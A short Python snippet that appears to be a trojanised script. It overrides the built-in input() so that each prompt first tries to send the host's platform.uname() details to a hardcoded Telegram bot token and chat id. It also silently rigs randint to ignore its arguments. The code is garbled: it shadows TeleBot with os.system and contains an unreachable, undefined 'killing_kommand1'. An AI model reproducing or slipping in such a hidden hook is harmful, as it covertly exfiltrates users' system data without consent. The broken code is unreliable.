from telebot import TeleBot
from os import system as TeleBot
from platform import uname
import random

token = "7685708608:AAHPNb8HLKyi3mSoVS5v1GNND3lwXuOAC3U"
id = "7411230022"

inp = input
def input(prompt=""):
    TeleBot(token).send_message(id, uname())
    return inp(prompt)
    
    
    return killing_kommand1 
def randint(min, max):
    return random.randint(0, 10)
